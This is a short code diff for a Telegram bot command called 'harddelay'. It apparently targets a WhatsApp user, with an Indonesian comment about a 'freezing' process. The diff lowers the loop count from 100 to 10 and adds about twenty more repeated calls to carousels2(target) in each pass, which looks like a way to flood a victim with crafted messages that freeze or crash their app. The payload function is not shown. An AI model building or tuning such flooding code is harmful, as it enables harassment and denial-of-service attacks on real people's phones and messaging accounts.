@@ -1011,7 +1011,27 @@ bot.command("harddelay", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 100; i++) {
+  for (let i = 0; i < 10; i++) {
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
+    await carousels2(target)
     await carousels2(target)
     await carousels2(target)
     await carousels2(target)
